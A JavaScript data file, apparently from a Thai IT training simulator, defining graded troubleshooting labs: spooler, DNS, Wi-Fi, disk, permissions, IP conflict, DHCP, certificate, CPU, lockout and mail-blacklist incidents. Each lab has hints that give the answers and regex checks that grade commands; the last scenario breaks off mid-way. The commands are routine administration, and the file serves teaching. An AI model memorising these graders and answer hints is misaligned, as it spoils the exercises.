// ============================================================
//  หมวด "เอาชีวิตรอด" ชุดที่ 2 — เหตุการณ์ที่เกิดขึ้นจริงในองค์กรไทย
// ============================================================
const node = (s, p) => {
  const parts = String(p).split('/').filter(Boolean);
  let n = s.fs;
  for (const x of parts) {
    if (!n || n.t !== 'd' || !n.children[x]) return null;
    n = n.children[x];
  }
  return n;
};
const said = (h, re) => h.some(c => re.test(String(c).trim()));
const T = (s, p) => s.tables[p] || [];
const has = (s, p, fn) => T(s, p).some(fn);
const F = n => 'FastEthernet0/' + n;
const G = n => 'GigabitEthernet0/' + n;
const ran = (a, b) => Array.from({ length: b - a + 1 }, (_, i) => a + i);
const grp = (s, n) => Object.keys(s.adGroups).find(x => x.toLowerCase() === n.toLowerCase());

export const SURVIVAL_LABS_2 = [
  // ============ ง่าย ============
  {
    id: 'sv-printer',
    title: 'เครื่องพิมพ์ทั้งออฟฟิศพิมพ์ไม่ออก',
    icon: '🖨️',
    difficulty: 'easy', severity: 'medium', time: '10 นาที',
    caller: 'ธุรการ',
    story: 'ธุรการโทรมาว่า "สั่งพิมพ์แล้วงานค้างอยู่ในคิว ไม่ออกสักงาน ทั้งชั้นเป็นเหมือนกันหมด" เอกสารต้องส่งลูกค้าภายในเที่ยงนี้ คุณ remote เข้าเซิร์ฟเวอร์พิมพ์ได้ปกติ',
    impact: 'งานเอกสารทั้งออฟฟิศหยุด — มีเอกสารด่วนรอส่งลูกค้า',
    device: 'windows-gui',
    init: {
      hostname: 'SRV-PRINT01', openApps: ['services.msc'],
      apply: st => { st.services.Spooler.status = 'Stopped'; st.services.Spooler.start = 'Manual'; },
    },
    tasks: [
      { t: 'เปิด <b>Services</b> ตรวจสถานะ Print Spooler', hint: 'ดับเบิลคลิกไอคอน Services', check: (s, h) => said(h, /gui:open:services\.msc/) },
      { t: 'กด <b>Start</b> ที่ service <code>Spooler</code>', hint: 'กดปุ่ม Start ที่แถว Spooler', check: s => s.services.Spooler.status === 'Running' },
      { t: 'ตั้ง Startup Type เป็น <code>Automatic</code> ไม่ให้ดับอีกหลังรีบูต', hint: 'เลือก Automatic ในช่อง Startup Type ของ Spooler', check: s => s.services.Spooler.start === 'Automatic' },
      { t: 'เปิด <b>Task Manager</b> ดูว่ามี process อะไรค้างไหม', hint: 'ดับเบิลคลิกไอคอน Task Manager', check: (s, h) => said(h, /gui:open:taskmgr/) },
      { t: 'ยืนยันด้วย Command Prompt: <code>sc query Spooler</code>', hint: 'เปิด Command Prompt แล้วพิมพ์ sc query Spooler', check: (s, h) => said(h, /^sc\s+query\s+spooler/i) },
      { t: 'เปิด <b>Event Viewer</b> เพื่อดูว่าอะไรทำให้ service ดับ', hint: 'ดับเบิลคลิกไอคอน Event Viewer', check: (s, h) => said(h, /gui:open:eventvwr/) },
    ],
    debrief: 'Print Spooler เป็น service ที่ตายบ่อยที่สุดตัวหนึ่งบน Windows โดยเฉพาะเมื่อมีงานพิมพ์เสียค้างในคิว — การกด Start อย่างเดียวแก้ได้ชั่วคราว แต่ถ้า <b>Startup Type เป็น Manual</b> มันจะไม่ขึ้นเองหลังรีบูต ต้องตั้งเป็น Automatic ด้วยเสมอ ถ้าดับซ้ำบ่อยให้ล้างคิวที่ <code>C:\\Windows\\System32\\spool\\PRINTERS</code> และตรวจว่าไดรเวอร์เครื่องพิมพ์ตัวไหนทำให้ crash',
  },

  {
    id: 'sv-dns-slow',
    title: 'เว็บเดียวเข้าไม่ได้ เว็บอื่นปกติ',
    icon: '🐢',
    difficulty: 'easy', severity: 'medium', time: '10 นาที',
    caller: 'ฝ่ายจัดซื้อ',
    story: 'ฝ่ายจัดซื้อบอกว่าเข้าเว็บซัพพลายเออร์ไม่ได้มาสองชั่วโมงแล้ว แต่เว็บอื่นเข้าได้หมด ลองใช้มือถือผ่าน 4G เข้าได้ปกติ แปลว่าเว็บไม่ได้ล่ม',
    impact: 'สั่งซื้อของไม่ได้ กระทบสายการผลิตพรุ่งนี้',
    device: 'windows',
    tasks: [
      { t: 'ตรวจการตั้งค่าเครือข่ายและ DNS ที่ใช้อยู่', hint: 'ipconfig /all', check: (s, h) => said(h, /^ipconfig\s*\/all/i) },
      { t: 'ดูว่าเครื่องจำ IP ของเว็บไหนไว้บ้าง', hint: 'ipconfig /displaydns', check: (s, h) => said(h, /ipconfig\s*\/displaydns/i) },
      { t: 'ถาม DNS ตรง ๆ ว่าชื่อนี้แปลงเป็น IP อะไร', hint: 'nslookup corp.local', check: (s, h) => said(h, /^nslookup/i) },
      { t: 'ล้าง DNS cache ที่จำค่าเก่าไว้', hint: 'ipconfig /flushdns', check: (s, h) => said(h, /ipconfig\s*\/flushdns/i) },
      { t: 'ทดสอบว่าออกอินเทอร์เน็ตด้วย IP ได้ปกติ', hint: 'ping 8.8.8.8', check: (s, h) => said(h, /^ping\s+8\.8\.8\.8/i) },
      { t: 'ตรวจเส้นทางว่าไปตันที่ hop ไหน', hint: 'tracert 8.8.8.8', check: (s, h) => said(h, /^tracert/i) },
      { t: 'ลงทะเบียนชื่อเครื่องกับ DNS ใหม่', hint: 'ipconfig /registerdns', check: (s, h) => said(h, /ipconfig\s*\/registerdns/i) },
    ],
    debrief: 'อาการ "เว็บเดียวเข้าไม่ได้ ที่เหลือปกติ" เกือบทั้งหมดเป็นเรื่อง DNS cache ที่จำ IP เก่าไว้หลังเว็บย้ายเซิร์ฟเวอร์ — <code>ipconfig /displaydns</code> จะเห็นว่าจำอะไรไว้ แล้ว <code>/flushdns</code> แก้ได้ทันที ถ้าเกิดกับทั้งบริษัทให้ล้าง cache ที่ DNS server ด้วย ไม่ใช่แค่ที่เครื่อง client',
  },

  {
    id: 'sv-wifi-profile',
    title: 'โน้ตบุ๊กเข้า Wi-Fi ไม่ได้หลังเปลี่ยนรหัส',
    icon: '📶',
    difficulty: 'easy', severity: 'medium', time: '10 นาที',
    caller: 'พนักงานขาย',
    story: 'IT เพิ่งเปลี่ยนรหัส Wi-Fi ออฟฟิศเมื่อวาน วันนี้พนักงานขาย 12 คนเข้า Wi-Fi ไม่ได้ ขึ้นว่า "Cannot connect to this network" ทั้งที่ใส่รหัสใหม่ถูกแล้ว',
    impact: 'พนักงานขายทำงานไม่ได้ ต้องใช้เน็ตมือถือส่วนตัว',
    device: 'windows',
    tasks: [
      { t: 'ดูว่าเครื่องเก็บโปรไฟล์ Wi-Fi อะไรไว้บ้าง', hint: 'netsh wlan show profiles', check: (s, h) => said(h, /netsh\s+wlan\s+show\s+profile/i) },
      { t: 'ดูสถานะการเชื่อมต่อ Wi-Fi ปัจจุบัน', hint: 'netsh wlan show interfaces', check: (s, h) => said(h, /netsh\s+wlan\s+show\s+interfaces/i) },
      { t: 'ลบโปรไฟล์เก่าที่ยังจำรหัสเดิม <code>CORP-WIFI</code>', hint: 'netsh wlan delete profile name="CORP-WIFI"', check: s => !s.wlanProfiles.includes('CORP-WIFI') },
      { t: 'ตรวจว่าลบออกไปแล้วจริง', hint: 'netsh wlan show profiles', check: (s, h) => h.filter(c => /netsh\s+wlan\s+show\s+profile/i.test(c)).length >= 2 },
      { t: 'ตรวจการตั้งค่า IP ปัจจุบัน', hint: 'ipconfig /all', check: (s, h) => said(h, /^ipconfig\s*\/all/i) },
      { t: 'ล้าง DNS cache เผื่อค้างค่าเก่า', hint: 'ipconfig /flushdns', check: (s, h) => said(h, /ipconfig\s*\/flushdns/i) },
    ],
    debrief: 'Windows จะ<b>จำรหัส Wi-Fi เดิมไว้ในโปรไฟล์</b> เมื่อรหัสเปลี่ยน มันจะพยายามต่อด้วยรหัสเก่าซ้ำ ๆ แล้วขึ้นข้อความว่าต่อไม่ได้ โดยไม่ถามรหัสใหม่ — ทางแก้คือลบโปรไฟล์เดิมทิ้งด้วย <code>netsh wlan delete profile</code> แล้วต่อใหม่ ถ้ามีเครื่องเยอะควรใช้ GPO หรือ Intune push โปรไฟล์ใหม่ให้ทุกเครื่องพร้อมกัน',
  },

  {
    id: 'sv-logdisk',
    title: 'Log กินดิสก์จนระบบเขียนไฟล์ไม่ได้',
    icon: '📜',
    difficulty: 'easy', severity: 'high', time: '15 นาที',
    caller: 'ระบบ Monitoring',
    story: 'ตี 4 ระบบแจ้งเตือนว่า / เหลือ 1% แอปเริ่มเขียน log ไม่ได้และตอบสนองช้ามาก มีคนเปิด debug logging ไว้เมื่อสัปดาห์ก่อนแล้วลืมปิด',
    impact: 'แอปพลิเคชันใกล้หยุดทำงาน และ log ที่ใช้สอบสวนย้อนหลังจะหายไป',
    device: 'linux',
    tasks: [
      { t: 'ตรวจพื้นที่ดิสก์ทั้งหมด', hint: 'df -h', check: (s, h) => said(h, /^(sudo\s+)?df\s+-h/i) },
      { t: 'ตรวจว่า inode หมดด้วยหรือไม่', hint: 'df -i', check: (s, h) => said(h, /df\s+-i/i) },
      { t: 'หาว่าโฟลเดอร์ไหนกินพื้นที่มากที่สุดใน <code>/var/log</code>', hint: 'du -sh /var/log', check: (s, h) => said(h, /^(sudo\s+)?du/i) },
      { t: 'ดูขนาดไฟล์ log แต่ละตัว', hint: 'ls -la /var/log', check: (s, h) => said(h, /ls\s+-l?a?l?a?\s+\/var\/log/i) },
      { t: 'ตรวจว่ามีการตั้ง logrotate ไว้หรือยัง', hint: 'ls -la /etc/logrotate.d', check: (s, h) => said(h, /logrotate/i) },
      { t: 'ดูเนื้อหา logrotate config ของ nginx', hint: 'cat /etc/logrotate.d/nginx', check: (s, h) => said(h, /cat\s+\/etc\/logrotate\.d/i) },
      { t: 'สร้างไฟล์ config ใหม่ <code>/etc/logrotate.d/app</code> เพื่อหมุน log ของแอป', hint: 'echo "/var/log/app.log { daily rotate 7 compress }" > /etc/logrotate.d/app', check: s => (node(s, '/etc/logrotate.d/app')?.content || '').length > 5 },
      { t: 'ตรวจว่า journald ใช้พื้นที่เท่าไร', hint: 'journalctl --disk-usage', check: (s, h) => said(h, /journalctl\s+--disk-usage/i) },
      { t: 'บันทึกสรุปเหตุการณ์ลง <code>/home/student/disk-incident.txt</code>', hint: 'df -h > /home/student/disk-incident.txt', check: s => (node(s, '/home/student/disk-incident.txt')?.content || '').length > 10 },
    ],
    debrief: '"ดิสก์เต็มเพราะ log" คือสาเหตุอันดับต้น ๆ ที่ทำให้ระบบล่มโดยไม่จำเป็น และป้องกันได้ 100% ด้วย logrotate — ที่สำคัญคือ <b>อย่าลบไฟล์ log ที่กำลังถูกเขียนอยู่ด้วย rm</b> เพราะ process ยังถือ file handle ไว้ พื้นที่จะไม่คืนจนกว่าจะ restart service ให้ใช้ <code>truncate -s 0</code> หรือรอ logrotate แทน และควรตั้ง alert ที่ 80% ไม่ใช่รอจน 99%',
  },

  {
    id: 'sv-user-deleted',
    title: 'ผู้ใช้ลบโฟลเดอร์สำคัญบน File Server',
    icon: '🗑️',
    difficulty: 'easy', severity: 'high', time: '15 นาที',
    caller: 'หัวหน้าฝ่ายบัญชี',
    story: 'หัวหน้าบัญชีโทรมาเสียงร้อนว่า "โฟลเดอร์งบการเงินปีนี้หายไปทั้งโฟลเดอร์!" ตรวจแล้วพบว่ามีพนักงานลบไปเมื่อเช้า และไม่มีใครรู้ว่ามี backup หรือเปล่า',
    impact: 'ข้อมูลงบการเงินทั้งปีอาจสูญหาย — กระทบการปิดงบไตรมาส',
    device: 'windows-gui',
    init: {
      hostname: 'SRV-FILE01', openApps: ['explorer'],
      apply: st => {
        st.fs['C:\\'].c.Shares = { d: true, c: { Finance: { d: true, c: {} } } };
        st.shares.Finance = { path: 'C:\\Shares\\Finance', desc: 'Finance department', full: 'Everyone' };
      },
    },
    tasks: [
      { t: 'เปิด <b>File Explorer</b> ตรวจสอบโฟลเดอร์ที่ถูกลบ', hint: 'ดับเบิลคลิกไอคอน File Explorer', check: (s, h) => said(h, /gui:open:explorer/) },
      { t: 'เปิด <b>Event Viewer</b> หาว่าใครลบและลบเมื่อไร', hint: 'ดับเบิลคลิกไอคอน Event Viewer', check: (s, h) => said(h, /gui:open:eventvwr/) },
      { t: 'สร้างโฟลเดอร์กู้คืนชั่วคราวชื่อ <code>Restore</code> ที่ <code>C:\\</code>', hint: 'ใน Explorer พิมพ์ Restore แล้วกด New folder', check: s => !!(s.fs['C:\\'].c.Restore) },
      { t: 'เปิด <b>Properties</b> ของโฟลเดอร์ <code>Shares</code> เพื่อตรวจสิทธิ์', hint: 'กด Properties ที่โฟลเดอร์ Shares', check: (s, h) => said(h, /gui:props:.*Shares/i) },
      { t: 'ที่แท็บ <b>Security</b> จำกัดสิทธิ์เป็น <code>Read</code> ให้ <code>CORP\\Finance-Read</code>', hint: 'แท็บ Security ใส่ CORP\\Finance-Read เลือก Read แล้วกด Apply', check: (s, h) => said(h, /gui:ntfs:.*Read/i) },
      { t: 'ยืนยันรายการแชร์ด้วย cmd: <code>net share</code>', hint: 'เปิด Command Prompt พิมพ์ net share', check: (s, h) => said(h, /^net\s+share/i) },
      { t: 'ตรวจสิทธิ์จริงของโฟลเดอร์ด้วย <code>icacls C:\\Shares</code>', hint: 'พิมพ์ icacls C:\\Shares', check: (s, h) => said(h, /^icacls/i) },
    ],
    debrief: 'เคสนี้สอนสองเรื่อง: (1) <b>Shadow Copies (Previous Versions)</b> ควรเปิดไว้ทุก File Server เพราะให้ผู้ใช้กู้ไฟล์เองได้ภายในไม่กี่คลิก โดยไม่ต้องรอ restore จาก backup (2) <b>สิทธิ์กว้างเกินไปคือต้นเหตุ</b> — ถ้าคนที่ต้องการแค่อ่านมีสิทธิ์ Modify ก็ลบได้ ควรใช้หลัก least privilege และเปิด audit log ของการลบไฟล์ไว้ด้วย',
  },

  // ============ ปานกลาง ============
  {
    id: 'sv-dup-ip',
    title: 'IP ชนกัน — เข้าได้บ้างไม่ได้บ้าง',
    icon: '⚔️',
    difficulty: 'medium', severity: 'high', time: '15 นาที',
    caller: 'ผู้ใช้หลายคน',
    story: 'มีคนแจ้งว่าเน็ต "เข้า ๆ ออก ๆ" ตั้งแต่เช้า บางทีเปิดเว็บได้ บางทีค้าง Windows ขึ้นเตือนว่า "Windows has detected an IP address conflict" ที่เครื่องหนึ่ง สงสัยว่ามีคนตั้ง static IP ทับ',
    impact: 'ผู้ใช้หลายคนใช้งานติด ๆ ขัด ๆ หาสาเหตุไม่ได้',
    device: 'windows',
    init: {
      apply: st => {
        st.arpTable.push({ ip: '192.168.10.5', mac: '00-1c-42-aa-bb-cc', type: 'dynamic' });
        st.arpTable.push({ ip: '192.168.10.5', mac: '00-0c-29-77-88-99', type: 'dynamic' });
      },
    },
    tasks: [
      { t: 'ตรวจ IP ของเครื่องตัวเองก่อน', hint: 'ipconfig /all', check: (s, h) => said(h, /^ipconfig\s*\/all/i) },
      { t: 'ดูตาราง ARP หา MAC ที่ผูกกับ IP เดียวกันสองตัว', hint: 'arp -a', check: (s, h) => said(h, /^arp\s+-a/i) },
      { t: 'ดู MAC ของเครื่องเราเพื่อเทียบ', hint: 'getmac', check: (s, h) => said(h, /^getmac/i) },
      { t: 'ล้าง ARP cache แล้วดูใหม่', hint: 'arp -d', check: (s, h) => said(h, /^arp\s+-d/i) },
      { t: 'ทดสอบว่ายังถึง gateway ไหม', hint: 'ping 192.168.10.1', check: (s, h) => said(h, /^ping\s+192\.168\.10\.1/i) },
      { t: 'ย้ายเครื่องนี้ไปใช้ IP ที่ไม่ชนกัน <code>192.168.10.77</code>', hint: 'netsh interface ip set address "Ethernet0" static 192.168.10.77 255.255.255.0 192.168.10.1', check: s => s.nics.Ethernet0.ip === '192.168.10.77' },
      { t: 'ตรวจ routing ว่ายังปกติ', hint: 'route print', check: (s, h) => said(h, /^route\s+print/i) },
      { t: 'ยืนยันผลด้วย ipconfig อีกครั้ง', hint: 'ipconfig', check: (s, h) => h.filter(c => /^ipconfig/i.test(c.trim())).length >= 2 },
    ],
    debrief: 'IP ชนกันทำให้ ARP table ปั่นป่วน — สวิตช์และเครื่องอื่นจะสลับส่ง traffic ไปหาสอง MAC สลับกัน ทำให้ "เข้าได้บ้างไม่ได้บ้าง" ซึ่งหาสาเหตุยากกว่าเน็ตล่มสนิท <b>ทางป้องกันที่ถูกคือกัน static IP ให้อยู่นอกช่วง DHCP pool</b> และใช้ DHCP reservation แทนการตั้ง static ที่เครื่อง เพื่อให้ทุก IP ถูกจัดการจากที่เดียว',
  },

  {
    id: 'sv-dhcp-exhaust',
    title: 'DHCP หมด pool — คนมาใหม่ไม่ได้ IP',
    icon: '🎟️',
    difficulty: 'medium', severity: 'high', time: '15 นาที',
    caller: 'ผู้จัดการสาขา',
    story: 'วันนี้มีอบรมพนักงาน 80 คนมาที่สำนักงาน พอถึงสาย ๆ คนที่มาทีหลังเริ่มต่อ Wi-Fi ไม่ได้ ได้ IP เป็น 169.254.x.x กันหมด ส่วนคนที่มาเช้าใช้งานได้ปกติ',
    impact: 'ผู้เข้าอบรมครึ่งห้องใช้งานระบบไม่ได้',
    device: 'mikrotik',
    init: {
      apply: st => {
        st.tables['ip address'].push({ _id: '*70', address: '192.168.88.1/24', network: '192.168.88.0', interface: 'ether2', disabled: false });
        st.tables['ip pool'].push({ _id: '*71', name: 'dhcp_lan', ranges: '192.168.88.100-192.168.88.120', disabled: false });
        st.tables['ip dhcp-server'].push({ _id: '*72', name: 'dhcp1', interface: 'ether2', 'address-pool': 'dhcp_lan', 'lease-time': '3d', disabled: false });
      },
    },
    tasks: [
      { t: 'ตรวจว่า DHCP server ตั้งค่าอย่างไรอยู่', hint: '/ip dhcp-server print', check: (s, h) => said(h, /dhcp-server\s+print/i) },
      { t: 'ดูช่วง IP ที่ pool แจกได้ (นี่คือต้นเหตุ)', hint: '/ip pool print', check: (s, h) => said(h, /ip\s+pool\s+print/i) },
      { t: 'ขยาย pool เป็น <code>192.168.88.100-192.168.88.240</code>', hint: '/ip pool set [find name=dhcp_lan] ranges=192.168.88.100-192.168.88.240', check: s => has(s, 'ip pool', r => r.name === 'dhcp_lan' && /240/.test(r.ranges || '')) },
      { t: 'ลด lease-time เหลือ <code>2h</code> เพื่อให้ IP หมุนเวียนเร็วขึ้น', hint: '/ip dhcp-server set [find name=dhcp1] lease-time=2h', check: s => has(s, 'ip dhcp-server', r => r.name === 'dhcp1' && String(r['lease-time']) === '2h') },
      { t: 'ตรวจว่า network config มี gateway และ DNS ครบ', hint: '/ip dhcp-server network print', check: (s, h) => said(h, /dhcp-server\s+network\s+print/i) },
      { t: 'เพิ่ม network config ถ้ายังไม่มี', hint: '/ip dhcp-server network add address=192.168.88.0/24 gateway=192.168.88.1 dns-server=8.8.8.8', check: s => has(s, 'ip dhcp-server network', r => r.address === '192.168.88.0/24') },
      { t: 'ตรวจผลด้วย print อีกครั้ง', hint: '/ip pool print', check: (s, h) => h.filter(c => /ip\s+pool\s+print/i.test(c)).length >= 2 },
      { t: 'ตั้ง netwatch เฝ้า gateway ไว้เผื่อเกิดซ้ำ', hint: '/tool netwatch add host=192.168.88.1', check: s => has(s, 'tool netwatch', r => r.host === '192.168.88.1') },
    ],
    debrief: 'pool ที่มีแค่ 21 IP แต่มีคน 80 คน ย่อมไม่พอ — และ <b>lease-time ที่ยาวเกินไป (3 วัน)</b> ทำให้ IP ของคนที่กลับบ้านไปแล้วยังถูกจองไว้ ไม่คืนเข้า pool สำหรับพื้นที่ที่คนเข้าออกบ่อย (ห้องประชุม, Wi-Fi ผู้มาติดต่อ) ควรตั้ง lease-time สั้น ๆ 1-2 ชั่วโมง และเผื่อขนาด pool ไว้อย่างน้อย 1.5 เท่าของจำนวนคนสูงสุด',
  },

  {
    id: 'sv-cert-expired',
    title: 'Certificate หมดอายุ เว็บขึ้นเตือนสีแดง',
    icon: '🔐',
    difficulty: 'medium', severity: 'high', time: '15 นาที',
    caller: 'ฝ่ายการตลาด',
    story: 'ลูกค้าโทรมาบอกว่าเข้าเว็บบริษัทแล้วเบราว์เซอร์ขึ้นหน้าแดง "Your connection is not private" ฝ่ายการตลาดร้อนใจเพราะกำลังยิงโฆษณาอยู่ ตรวจแล้วพบว่า certificate หมดอายุเมื่อคืน',
    impact: 'ลูกค้าไม่กล้าเข้าเว็บ — เสียยอดขายและความน่าเชื่อถือ',
    device: 'linux',
    init: { apply: st => { st.services.nginx.active = true; st.services.nginx.enabled = true; } },
    tasks: [
      { t: 'ตรวจว่าเว็บเซิร์ฟเวอร์ยังทำงานอยู่', hint: 'systemctl status nginx', check: (s, h) => said(h, /systemctl\s+status\s+nginx/i) },
      { t: 'ตรวจวันหมดอายุของ certificate', hint: 'openssl x509 -noout -dates', check: (s, h) => said(h, /openssl\s+x509/i) },
      { t: 'ตรวจ certificate ที่เสิร์ฟออกไปจริง', hint: 'openssl s_client -connect localhost:443', check: (s, h) => said(h, /openssl\s+s_client/i) },
      { t: 'ตรวจว่าพอร์ต 443 เปิดฟังอยู่', hint: 'ss -tulpn', check: (s, h) => said(h, /^(sudo\s+)?(ss|netstat)/i) },
      { t: 'ตรวจ config ของ nginx', hint: 'cat /etc/nginx/nginx.conf', check: (s, h) => said(h, /cat\s+\/etc\/nginx/i) },
      { t: 'ตรวจว่าเวลาเครื่องตรงหรือไม่ (cert ตรวจจากเวลา)', hint: 'timedatectl', check: (s, h) => said(h, /^timedatectl/i) },
      { t: 'ตั้ง timezone ให้ถูกต้อง', hint: 'sudo timedatectl set-timezone Asia/Bangkok', check: s => s.timezone === 'Asia/Bangkok' },
      { t: 'reload nginx หลังติดตั้ง cert ใหม่', hint: 'sudo systemctl restart nginx', check: (s, h) => said(h, /systemctl\s+(restart|reload)\s+nginx/i) },
      { t: 'ทดสอบว่าเว็บกลับมาปกติ', hint: 'curl -I http://localhost', check: (s, h) => said(h, /^curl/i) },
      { t: 'ตั้ง cron เตือนล่วงหน้า — ตรวจรายการ cron ปัจจุบัน', hint: 'crontab -l', check: (s, h) => said(h, /crontab\s+-l/i) },
    ],
    debrief: 'Certificate หมดอายุคือเหตุที่<b>รู้ล่วงหน้าได้ 100%</b> แต่ยังเกิดซ้ำทุกปีเพราะไม่มีใครเฝ้า — ทางแก้ที่ถูกคือใช้ ACME/Let\'s Encrypt ที่ต่ออายุอัตโนมัติ และตั้ง monitoring แจ้งเตือนที่ <b>30 วันก่อนหมดอายุ</b> ไม่ใช่วันหมดอายุ อีกจุดที่คนลืมคือ <b>เวลาเครื่องต้องตรง</b> เพราะถ้านาฬิกาเพี้ยน cert ที่ยังไม่หมดอายุก็ถูกมองว่าหมดอายุได้',
  },

  {
    id: 'sv-cpu-100',
    title: 'เซิร์ฟเวอร์ CPU 100% ทั้งวัน',
    icon: '🔥',
    difficulty: 'medium', severity: 'high', time: '15 นาที',
    caller: 'ผู้ใช้ระบบ ERP',
    story: 'ผู้ใช้ ERP บ่นว่าระบบช้ามากตั้งแต่เมื่อวาน กดอะไรก็หมุน ตรวจจาก monitoring พบ CPU ค้างที่ 95-100% ตลอด 18 ชั่วโมง แต่ไม่มีใครรู้ว่า process ไหนกิน',
    impact: 'ระบบ ERP ช้าจนทำงานไม่ได้ กระทบทั้งบริษัท',
    device: 'linux',
    tasks: [
      { t: 'ดู load average และ uptime', hint: 'uptime', check: (s, h) => said(h, /^uptime/i) },
      { t: 'ดู process ที่กิน CPU มากที่สุด', hint: 'ps aux', check: (s, h) => said(h, /^(sudo\s+)?ps\s/i) },
      { t: 'ตรวจหน่วยความจำว่ามี swap ถูกใช้หนักไหม', hint: 'free -h', check: (s, h) => said(h, /^(sudo\s+)?free/i) },
      { t: 'ตรวจพื้นที่ดิสก์ (I/O wait อาจมาจากดิสก์เต็ม)', hint: 'df -h', check: (s, h) => said(h, /^(sudo\s+)?df/i) },
      { t: 'ตรวจว่ามี container ทำงานผิดปกติหรือไม่', hint: 'docker ps', check: (s, h) => said(h, /docker\s+ps/i) },
      { t: 'ดู resource ที่แต่ละ container ใช้', hint: 'docker stats', check: (s, h) => said(h, /docker\s+stats/i) },
      { t: 'ตรวจ log ระดับ error ตั้งแต่บูต', hint: 'journalctl -p err', check: (s, h) => said(h, /journalctl\s+-p/i) },
      { t: 'ตรวจว่ามี process แปลกปลอมไหม (อาจโดน crypto miner)', hint: 'sudo rkhunter --check', check: (s, h) => said(h, /rkhunter|chkrootkit/i) },
      { t: 'ตรวจการเชื่อมต่อขาออกที่น่าสงสัย', hint: 'ss -tulpn', check: (s, h) => said(h, /^(sudo\s+)?(ss|netstat)/i) },
      { t: 'บันทึกหลักฐานลง <code>/home/student/cpu-incident.txt</code>', hint: 'ps aux > /home/student/cpu-incident.txt', check: s => (node(s, '/home/student/cpu-incident.txt')?.content || '').length > 10 },
    ],
    debrief: 'CPU 100% ต่อเนื่องมี 3 สาเหตุหลัก: (1) แอปมีบั๊ก/query หนักผิดปกติ (2) <b>I/O wait</b> จากดิสก์ช้าหรือเต็ม ซึ่ง load สูงแต่ CPU ไม่ได้ทำงานจริง (3) <b>crypto miner</b> จากการถูกเจาะ — จุดสังเกตของข้อ 3 คือ process ชื่อแปลก ๆ ที่รันด้วยสิทธิ์ผู้ใช้ธรรมดา และมี connection ขาออกไป pool ต่างประเทศ ควรแยกให้ออกก่อนจะรีสตาร์ท เพราะรีสตาร์ททิ้งจะทำให้หลักฐานหาย',
  },

  {
    id: 'sv-account-lockout',
    title: 'บัญชีผู้บริหารถูกล็อกซ้ำ ๆ ทุก 15 นาที',
    icon: '🔒',
    difficulty: 'medium', severity: 'high', time: '20 นาที',
    caller: 'ผู้ช่วยผู้บริหาร',
    story: 'บัญชีของ CFO ถูกล็อกซ้ำ ๆ ทุก 15 นาทีมาสองวันแล้ว ปลดล็อกไปกี่ครั้งก็โดนอีก ทีมสงสัยว่าอาจโดน brute force แต่ก็อาจเป็นมือถือเครื่องเก่าที่ยังจำรหัสเดิมไว้',
    impact: 'ผู้บริหารเข้าอีเมลและระบบไม่ได้ ต้องโทรหา IT ทุกชั่วโมง',
    device: 'windows-gui',
    init: {
      hostname: 'SRV-DC01', openApps: ['eventvwr'],
      apply: st => {
        st.domain = 'corp.local'; st.isDC = true;
        st.features.add('AD-Domain-Services');
        st.adGroups['Domain Users'] = ['Administrator', 'cfo.somsri'];
        st.adUsers['cfo.somsri'] = { name: 'Somsri CFO', sam: 'cfo.somsri', enabled: true, upn: 'cfo.somsri@corp.local', path: 'CN=Users,DC=corp,DC=local', groups: ['Domain Users'] };
      },
    },
    tasks: [
      { t: 'เปิด <b>Event Viewer</b> ดู Security log หา Event ID 4740 (account lockout)', hint: 'ดับเบิลคลิกไอคอน Event Viewer', check: (s, h) => said(h, /gui:open:eventvwr/) },
      { t: 'เปิด <b>Active Directory Users and Computers</b>', hint: 'ดับเบิลคลิกไอคอน ADUC', check: (s, h) => said(h, /gui:open:dsa\.msc/) },
      { t: '<b>Containment ชั่วคราว:</b> ปิดบัญชี <code>cfo.somsri</code> เพื่อหยุดวงจร', hint: 'เลือก cfo.somsri แล้วกด Disable selected user', check: s => s.adUsers['cfo.somsri'] && s.adUsers['cfo.somsri'].enabled === false },
      { t: 'สร้างกลุ่ม <code>MFA-Required</code> เตรียมบังคับ MFA', hint: 'ใส่ MFA-Required แล้วกด Create group', check: s => !!grp(s, 'MFA-Required') },
      { t: 'เพิ่ม <code>cfo.somsri</code> เข้ากลุ่ม <code>MFA-Required</code>', hint: 'เลือกกลุ่มและผู้ใช้ แล้วกด Add to group', check: s => { const g = grp(s, 'MFA-Required'); return !!g && s.adGroups[g].includes('cfo.somsri'); } },
      { t: 'เปิดบัญชีคืนหลังรีเซ็ตรหัสและถอดอุปกรณ์เก่าออกแล้ว', hint: 'กด Enable selected user', check: s => s.adUsers['cfo.somsri'] && s.adUsers['cfo.somsri'].enabled === true },
      { t: 'ยืนยันด้วย Command Prompt: <code>net user</code>', hint: 'เปิด Command Prompt พิมพ์ net user', check: (s, h) => said(h, /^net\s+user/i) },
      { t: 'ตรวจ scheduled task ว่ามี service account ที่ใช้รหัสเก่าไหม', hint: 'พิมพ์ schtasks /query', check: (s, h) => said(h, /schtasks\s*\/query/i) },
    ],
    debrief: 'Account lockout ซ้ำ ๆ เป็นจังหวะสม่ำเสมอ (ทุก 15 นาที) มัก<b>ไม่ใช่</b> brute force แต่เป็น "อะไรบางอย่างที่ยังจำรหัสเก่าไว้แล้วพยายามล็อกอินเอง" — ตัวการยอดฮิตคือมือถือ/แท็บเล็ตที่ตั้งอีเมลไว้, mapped drive, scheduled task ที่รันด้วยบัญชีนั้น, หรือ service ที่ตั้ง credential เก่าไว้ วิธีหาคือดู Event 4740 แล้วดูฟิลด์ <b>Caller Computer Name</b> ว่ามาจากเครื่องไหน',
  },

  {
    id: 'sv-mail-blacklist',
    title: 'อีเมลบริษัทส่งออกไม่ได้ — ติด Blacklist',
    icon: '📧',
    difficulty: 'medium', severity: 'high', time: '20 นาที',
    caller: 'ทุกแผนก',
    story: 'ตั้งแต่เช้าอีเมลที่ส่งออกไปข้างนอกตีกลับหมด ข้อความบอกว่า IP ของเราอยู่ใน blacklist สงสัยว่ามีเครื่องในบริษัทติดมัลแวร์แล้วส่งสแปมออกไปทาง SMTP',
    impact: 'ติดต่อลูกค้าทางอีเมลไม่ได้เลยทั้งบริษัท',
    device: 'linux-sec',
    tasks: [
      { t: 'ตรวจการเชื่อมต่อขาออกที่เปิดอยู่', hint: 'ss -tulpn', check: (s, h) => said(h, /^(sudo\s+)?(ss|netstat)/i) },
      { t: 'ตรวจ process ที่กำลังทำงาน', hint: 'ps aux', check: (s, h) => said(h, /^(sudo\s+)?ps\s/i) },
      { t: 'ตรวจสอบ DNS record ของโดเมนตัวเอง', hint: 'dig example.com', check: (s, h) => said(h, /^dig\s/i) },
      { t: 'ดักจับ traffic เพื่อดูว่ามีอะไรส่งออกผิดปกติ', hint: 'sudo tcpdump -i ens33', check: (s, h) => said(h, /tcpdump/i) },
